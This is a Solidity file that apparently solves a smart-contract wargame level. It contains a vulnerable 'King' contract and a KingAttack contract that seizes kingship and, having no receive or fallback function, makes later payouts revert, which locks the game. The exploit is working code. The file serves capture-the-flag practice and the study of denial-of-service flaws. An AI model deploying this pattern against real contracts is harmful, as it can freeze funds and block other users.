// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}



contract KingAttack {
    // no receive() - no ETH transfer
    // no fallback() - ETH transfer will fail
    
    constructor(address payable _kingContract) payable {
        uint256 prize = King(_kingContract).prize();
        (bool success, ) = _kingContract.call{value: prize}("");
        require(success, "Failed to send ether");
    }
}

// https://sepolia.etherscan.io/tx/0x6b0702eb7d2dd518f60f90bb05a092a1d2bc32a2225da17fe18920e86129ce87